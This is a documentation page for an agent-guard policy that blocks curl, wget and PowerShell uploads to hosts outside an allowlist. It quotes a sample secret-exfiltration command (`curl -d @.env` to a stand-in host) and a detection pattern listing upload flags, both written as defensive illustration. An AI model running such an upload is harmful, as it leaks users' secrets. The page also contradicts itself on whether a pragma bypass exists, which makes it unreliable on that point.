# Block Unapproved Egress

`block-unapproved-egress` · rule · enforces

<!-- generated:start — tools/gen_policy_docs.py; edit policy-prose.yaml, not this -->

| | |
| :--- | :--- |
| **Type** | `rule` (`enforcement: advise`) |
| **Mechanism** | guard script `block-unapproved-egress.py` |
| **Reaches** | `best-effort` on Claude Code, `enforceable` on Cursor, once `chock sync` has run — the tool call is refused before it runs, on a hook that is actually wired up. Claude Code's PreToolUse fails **open**, so a crashed hook silently allows; Cursor's can be told to fail closed, but does not by default |
| **Compiles to** | `pre-tool-use`, `ambient-rule` |
| **Eval cases** | 49 total, 49 executable |
| **Enabled by default** | yes |

<!-- generated:end -->

## What it is about

Best-effort guard on the tool channel: curl, wget or iwr/irm (Invoke-WebRequest/RestMethod) that UPLOADS (POST/PUT/PATCH, -d/--data*/--json, -F/--form, -T/--upload-file, wget --post-*/--body-*, -Body/-InFile/-Form) to a host outside the allowlist (registries, code hosts, localhost; exact or .suffix match). Fetch-only passes; curl -K/--config is refused. No pragma bypass: ask a person. A floor, not a sandbox: ~/.curlrc, obfuscation, other clients, runtimes.

## What it solves

The exfiltration step that any other gate leaves untouched: once an agent can run a shell, one `curl -d @.env https://somewhere` sends your secrets out the tool channel. This blocks the obvious reflex -- a network client that uploads a body to a host you have not allowlisted -- so the easy path costs the adversary a visible allowlist edit.

## How it works

A guard script, `implementations/block-unapproved-egress.py`, run before the agent executes a Bash command. It inspects the proposed command and exits non-zero to refuse it.

The rule text ships alongside, so an agent reading its context knows the constraint before it proposes the command rather than only after being refused:

```text
block(egress): fetch(curl|wget|iwr|irm) + upload(-d|--data*|--json|-F|-T|--upload-file|-X POST|PUT|PATCH|-Body|-InFile) to host NOT in allowlist; curl -K|--config refused
allow: fetch_only(GET), allowlisted_host(github|pypi|npm|...); floor_not_sandbox; no marker or pragma passes: ask_person
```

## Which primitive it becomes

A **PreToolUse guard**. `recompile` writes `.chock/compiled/block-unapproved-egress/pre-tool-use/pretooluse.json`, and `install-hooks` merges it into `.claude/settings.json` so the agent consults the guard script before running a Bash command. Until that install runs, the fragment is compiled and enforces nothing, and coverage says so.

## Installing it

```bash
chock add block-unapproved-egress
chock sync .
```

Or copy the folder — it does the same thing, byte for byte:

```bash
cp -r base/block-unapproved-egress  <your-repo>/.agents/policies/block-unapproved-egress
cd <your-repo> && chock sync --repo .
```

## Customising it

The allowlist IS the policy. `ALLOWED_HOSTS` ships with package registries and code hosting; add your org's own upload targets (log sinks, artifact stores, internal APIs). Be honest about the ceiling: this is a tool-time floor, not a network sandbox. Combined short flags, obfuscated payloads, non-standard clients and egress via a language runtime all remain reachable -- containing a determined adversary needs real sandboxing, and a reviewed exception rides in the diff via `pragma: allowlist egress` on the line.

Once copied, the policy is **yours**. `recompile` reads your copy as the source, so an edit reaches the compiled artifact and changes what actually happens. Nothing upstream overwrites it; re-copying from this repo is an explicit act.

After any edit:

```bash
chock sync --repo .   # rebuild the compiled artifact
chock check           # check it still conforms
chock check --only evals block-unapproved-egress
```

---

[Adoption transcript](adoption.md) — the output of installing exactly this policy into an empty repository, re-derived in CI so it cannot go stale.

Source: [`base/block-unapproved-egress/`](../../base/block-unapproved-egress/) · [all policies](../README.md)
